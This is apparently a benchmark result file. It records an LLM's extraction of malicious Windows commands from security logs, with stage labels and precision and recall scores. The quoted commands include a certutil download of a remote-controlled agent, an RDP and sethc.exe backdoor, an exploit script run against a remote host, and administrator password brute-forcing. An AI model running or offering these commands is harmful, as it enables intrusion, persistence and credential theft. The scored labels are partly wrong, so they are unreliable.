@@ -1,0 +1,76 @@
+{
+  "output": {
+    "malicious_events": [
+      {
+        "command": "cmd.exe /c \"taskkill /f /im agent.exe&certutil -urlcache -split -f http://124.223.85.207:8079/sangforcat.exe C:\\Users\\Public\\agent.exe&cmd /c start /min C:\\Users\\Public\\agent.exe -opid 7fa51253-c053-4b44-94eb-5d8a161b429b -server https://124.223.85.207:8443\"",
+        "stage": "Initial Access"
+      },
+      {
+        "command": "certutil  -urlcache -split -f http://124.223.85.207:8079/sangforcat.exe C:\\Users\\Public\\agent.exe",
+        "stage": "Execution"
+      },
+      {
+        "command": "C:\\Users\\Public\\agent.exe  -opid 7fa51253-c053-4b44-94eb-5d8a161b429b -server https://124.223.85.207:8443",
+        "stage": "Command and Control"
+      },
+      {
+        "command": "powershell.exe -ExecutionPolicy Bypass -C \"reg add \"HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Control\\Terminal Server\" /v fDenyTSConnections /t REG_DWORD /d 0 /f;netsh advfirewall firewall add rule name=\"Remote Desktop\" dir=in action=allow protocol=TCP localport=3389;reg query \"HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Control\\Terminal Server\";REG ADD \"HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options\\sethc.exe\" /v Debugger /t REG_SZ /d \"C:\\windows\\system32\\cmd.exe\"",
+        "stage": "Persistence"
+      },
+      {
+        "command": "powershell.exe -ExecutionPolicy Bypass -C \"cmd /c 'python PhpStudyExp2.py http://121.36.30.176/ \\'whoami&arp -a&ipconfig&ping www.baidu.com -c 1\\'''",
+        "stage": "Discovery"
+      },
+      {
+        "command": "cmd.exe /c WinBrute.exe administrator_pass.txt administrator",
+        "stage": "Credential Access"
+      }
+    ],
+    "narrative": "An initial access attempt is observed via downloading an executable named 'agent.exe' using 'certutil'. The execution of this payload suggests an immediate establishment of a command-and-control channel back to the attacker. Further actions include modifying registry keys and firewall rules for persistence. Additionally, there are attempts to gather information such as running processes ('Discovery') and brute-forcing administrative accounts ('Credential Access'). Overall, the sequence indicates a well-coordinated cyberattack aimed at establishing persistent presence and accessing sensitive resources.",
+    "_parse_ok": true,
+    "_cost": {
+      "llm_calls": 1,
+      "prompt_tokens": 10538,
+      "completion_tokens": 682,
+      "total_tokens": 11220,
+      "wall_clock_s": 16.603,
+      "parse_retries": 0
+    }
+  },
+  "score": {
+    "event": {
+      "precision": 0.8333333333333334,
+      "recall": 0.7142857142857143,
+      "f1": 0.7692307692307692,
+      "tp": 5,
+      "fp": 1,
+      "fn": 2
+    },
+    "stage": {
+      "precision": 0.5,
+      "recall": 0.5,
+      "f1": 0.5,
+      "tp": 3,
+      "fp": 3,
+      "fn": 3,
+      "recall_partial": 0.5833333333333334
+    },
+    "hallucination_rate": 0.0,
+    "cost": {
+      "llm_calls": 1,
+      "prompt_tokens": 10538,
+      "completion_tokens": 682,
+      "total_tokens": 11220,
+      "wall_clock_s": 16.603,
+      "parse_retries": 0
+    }
+  },
+  "meta": {
+    "variant": "scale_v4",
+    "max_tokens": 4096,
+    "prompt_variant": "stagedefs",
+    "gpu": "NVIDIA A100 80GB PCIe",
+    "triage": true,
+    "got_link_hints": false
+  }
+}
